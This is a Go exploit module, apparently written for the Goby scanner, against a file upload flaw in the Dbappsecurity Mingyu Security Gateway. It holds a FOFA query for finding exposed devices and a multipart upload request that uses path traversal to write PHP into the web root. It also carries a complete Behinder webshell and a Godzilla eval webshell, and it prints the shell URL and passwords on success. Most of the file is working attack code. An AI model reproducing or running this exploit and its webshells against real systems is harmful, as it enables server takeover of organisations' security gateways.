package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Dbappsecurity Mingyu Security Gateway aaa_local_web_preview File Upload Vulnerability",
    "Description": "<p>Mingyu Security Gateway adheres to the concept of security visibility, simplicity and effectiveness, and builds a next-generation security protection system for full-process defense from the perspective of assets, and integrates traditional firewalls, intrusion detection, intrusion prevention systems, anti-virus gateways, Internet behavior control, An intelligent security gateway integrating security modules such as VPN gateway and threat intelligence. There is a file upload vulnerability in the aaa_local_web_preview file of Mingyu Security Gateway.</p><p>Attackers can use this vulnerability to upload malicious files and obtain server permissions.</p>",
    "Product": "DAS_Security-Mingyu-SecGW",
    "Homepage": "https://www.dbappsecurity.com.cn/",
    "DisclosureDate": "2023-02-27",
    "Author": "715827922@qq.com",
    "FofaQuery": "title=\"明御安全网关\"",
    "GobyQuery": "title=\"明御安全网关\"",
    "Level": "3",
    "Impact": "<p>Attackers can exploit this vulnerability to upload malicious files and perform sensitive operations to obtain server permissions.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.dbappsecurity.com.cn/\">https://www.dbappsecurity.com.cn/</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "webshell,custom",
            "show": ""
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "behinder,godzilla",
            "show": "attackType=webshell"
        },
        {
            "name": "content",
            "type": "input",
            "value": "test",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "安恒明御安全网关 aaa_local_web_preview 文件上传漏洞",
            "Product": "安恒信息-明御安全网关",
            "Description": "<p>明御安全网关秉持安全可视、简单有效的理念，以资产为视角，构建全流程防御的下一代安全防护体系，并融合传统防火墙、入侵检测、入侵防御系统、防病毒网关、上网行为管控、VPN网关、威胁情报等安全模块于一体的智慧化安全网关。明御安全网关在aaa_local_web_preview文件处存在文件上传漏洞。</p><p>攻击者可以利用该漏洞上传恶意文件进而获取服务器权限等。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：&nbsp;<a href=\"https://www.dbappsecurity.com.cn/\">https://www.dbappsecurity.com.cn/</a></p>",
            "Impact": "<p>攻击者可以利用该漏洞上传恶意文件进而进行敏感操作获取服务器权限。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "Dbappsecurity Mingyu Security Gateway aaa_local_web_preview File Upload Vulnerability",
            "Product": "DAS_Security-Mingyu-SecGW",
            "Description": "<p>Mingyu Security Gateway adheres to the concept of security visibility, simplicity and effectiveness, and builds a next-generation security protection system for full-process defense from the perspective of assets, and integrates traditional firewalls, intrusion detection, intrusion prevention systems, anti-virus gateways, Internet behavior control, An intelligent security gateway integrating security modules such as VPN gateway and threat intelligence. There is a file upload vulnerability in the aaa_local_web_preview file of Mingyu Security Gateway.</p><p>Attackers can use this vulnerability to upload malicious files and obtain server permissions.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:&nbsp;<a href=\"https://www.dbappsecurity.com.cn/\">https://www.dbappsecurity.com.cn/</a></p>",
            "Impact": "<p>Attackers can exploit this vulnerability to upload malicious files and perform sensitive operations to obtain server permissions.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-08-08",
    "PocId": "10818"
}`
	sendShell34sdfwe := func(hostInfo *httpclient.FixUrl, fileName, content, url string) (*httpclient.HttpResponse, error) {
		var cfg *httpclient.RequestConfig
		if fileName == "" {
			cfg = httpclient.NewGetRequestConfig(url)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Timeout = 15
		} else {
			cfg = httpclient.NewPostRequestConfig(url)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "multipart/form-data; boundary=849978f98abe41119122148e4aa65b1a")
			cfg.Header.Store("Referer", hostInfo.FixedHostInfo)
			cfg.Data = fmt.Sprintf("--849978f98abe41119122148e4aa65b1a\r\nContent-Disposition: form-data; name=\"123\"; filename=\"%s\"\r\nContent-Type: text/plain\r\n\r\n%s\r\n--849978f98abe41119122148e4aa65b1a--", fileName, content)
		}
		resp, err := httpclient.DoHttpRequest(hostInfo, cfg)
		if err != nil {
			return resp, err
		}
		return resp, err
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			fileName := goutils.RandomHexString(6)
			fileName += ".php"
			if resp, err := sendShell34sdfwe(hostInfo, fileName, "<?php echo md5(123443214);unlink(__FILE__);?>", "/webui/?g=aaa_local_web_preview&name=123&read=0&suffix=/../../../HKfQgRMO.php"); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "success") {
					// 发送攻击请求
					if resp1, err := sendShell34sdfwe(hostInfo, "", "", "/HKfQgRMO.php"); err == nil {
						return resp1.StatusCode == 200 && strings.Contains(resp1.RawBody, "f8ba6af3dec80b760286de503e63f9fa")
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			content := goutils.B2S(ss.Params["content"])
			if attackType == "webshell" {
				webShell := goutils.B2S(ss.Params["webshell"])
				if webShell == "behinder" {
					// /*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
					content = `<?php @error_reporting(0); session_start(); $key="e45e329feb5d925b"; $_SESSION['k']=$key; session_write_close(); $post=file_get_contents("php://input"); if(!extension_loaded('openssl')) {$t="base64_"."decode"; $post=$t($post.""); for($i=0;$i<strlen($post);$i++) {$post[$i] = $post[$i]^$key[$i+1&15]; }} else {$post=openssl_decrypt($post, "AES128", $key);} $arr=explode('|',$post); $func=$arr[0]; $params=$arr[1]; class C{public function __invoke($p) {eval($p."");}} @call_user_func(new C(),$params); ?>`
				} else if webShell == "godzilla" {
					// 哥斯拉 pass key
					content = `<?php eval($_POST["pass"]);`
				}
				fileName := goutils.RandomHexString(6)
				fileName += ".php"
				if resp, err := sendShell34sdfwe(expResult.HostInfo, fileName, content, "/webui/?g=aaa_local_web_preview&name=123&read=0&suffix=/../../../HKfQgRMO.php"); err == nil {
					if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "success") {
						if resp.StatusCode == 200 {
							expResult.Success = true
							expResult.Output += "WebShell URL: " + expResult.HostInfo.FixedHostInfo + "/HKfQgRMO.php" + "\n"
							if attackType != "custom" && webShell == "behinder" {
								expResult.Output += "Password: rebeyond\n"
								expResult.Output += "WebShell tool: Behinder v3.0\n"
							} else if attackType != "custom" && webShell == "godzilla" {
								expResult.Output += "Password: pass 加密器：PHP_EVAL_XOR_BASE64\n"
								expResult.Output += "WebShell tool: Godzilla v4.1\n"
							} else {
								fmt.Println("no")
							}
							expResult.Output += "Webshell type: php"
						} else {
							expResult.Success = false
							expResult.Output = "漏洞利用失败"
						}
					}
				} else {
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
				}
			} else if attackType == "custom" {
				fileName := goutils.RandomHexString(6)
				fileName += ".php"
				if resp, err := sendShell34sdfwe(expResult.HostInfo, fileName, content, "/webui/?g=aaa_local_web_preview&name=123&read=0&suffix=/../../../HKfQgRMO.php"); err == nil {
					if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "success") {
						expResult.Success = true
						expResult.Output = "漏洞利用成功\n"
						expResult.Output += "File URL: " + expResult.HostInfo.FixedHostInfo + "/HKfQgRMO.php" + "\n"
					} else {
						expResult.Success = false
						expResult.Output = "漏洞利用失败"
					}
				}
			}
			return expResult
		},
	))
}
